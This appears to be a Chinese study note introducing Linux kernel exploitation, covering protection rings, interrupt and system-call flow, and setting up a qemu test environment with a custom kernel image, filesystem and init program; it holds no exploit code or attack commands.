kernel入门

​ 利用Linux内核中的漏洞，从普通用户态提升到内核态，最终拿到root权限设置控制整个系统。

基础

内核

kernel：操作系统最核心的部分。

在操作系统课程中也有提到，用户程序不能直接操作硬件（无权限），所以需要依靠内核来完成

其核心任务分为一下五方面：

  1. 内存管理
  2. 设备驱动管理
  3. 进程管理
  4. 文件系统管理
  5. 系统调用与安全

分级保护环(Ring环)

是一种将计算机不同的资源划分至不同权限的模型。（目的是进行权限隔离）

  • Ring 0（最高权限 - 内核态）：
    • 角色： 这里的代码拥有对计算机硬件的绝对控制权。它可以执行任何 CPU 指令，访问任何内存地址，直接控制网卡、显卡等硬件设备。
    • 运行内容： 操作系统的核心（Kernel）
  • Ring 1 和 Ring 2（中间权限）：
    • 角色： 操作系统的设备驱动程序或某些系统服务使用，权限介于内核和普通应用之间。
    • 现实情况： 在现代主流操作系统（如 Windows、Linux、macOS）中，这两个环几乎被废弃不用。
  • Ring 3（最低权限 - 用户态）：
    • 角色： 这里的代码受到严格的硬件限制。它不能直接访问硬件，不能修改页表（内存分配），也不能干涉其他程序的运行。如果它试图执行越权指令，CPU 会直接拦截并抛出异常（通常导致程序崩溃退出）。
    • 运行内容： 所有普通应用程序（微信、浏览器、游戏、甚至是编写的 Python/C++ 代码）都运行在这里。

用户态（Ring3）—>内核态（Ring0）：

中断

硬件/异常主动打断CPU

执行过程：

  1. 发生中断
  2. CPU保存现场
  3. 切换到内核态
  4. 查中断向量表
  5. 执行中断服务程序
  6. 恢复现场
系统调用

用户程序合法地主动请求内核完成某些特权服务

（比如程序常使用的某些函数：open，write，read等等）

可以参考ctf-pwn里的retsyscall

执行过程：

  1. 用户态通过syscall请求内核服务（调用某些库函数也是）
  2. 设置系统调用号
  3. 执行特殊指令（进入内核态）
  4. 内核根据syscall number来实现
  5. 内核执行
  6. 返回用户态

内核态（Ring0）—>用户态（Ring3）

使用特权返回指令。

（返回之前会恢复一系列寄存器）

环境模拟

真实的kernel里限制太多了，我们用于学习kernel pwn的小程序可能因为各种条件与kernel保护机制实现不起来，所以我们得自己用qemu模拟一下小的内核环境来测试。

其实用qemu模拟kernel环境总共就需要三样东西：

1.rootfs.cpio.gz：打包好的文件系统，作为模拟的内核环境的文件系统

2.bzImage：Linux内核编译后的可引导压缩内核镜像文件

3.run.sh：启动qemu的脚本

一开始我直接cp自己本机的bzImage，这就导致模拟出来的内核环境与本机基本相似，限制太多了，所以得自己下载linux内核源码，自己配置自己编译。

init程序

在rootfs文件夹，也就是我们用来模拟的系统根目录里必须要有init这么一个程序。

因为：

Linux本身只是一个底层的基础设施（负责管理内存、CPU 调度、驱动硬件等），当内核完成自身的初始化后并不能提供给我们用户一个敲命令的命令行，所以我们需要让内核在初始化后就启动这个程序，用于将控制权交给用户。
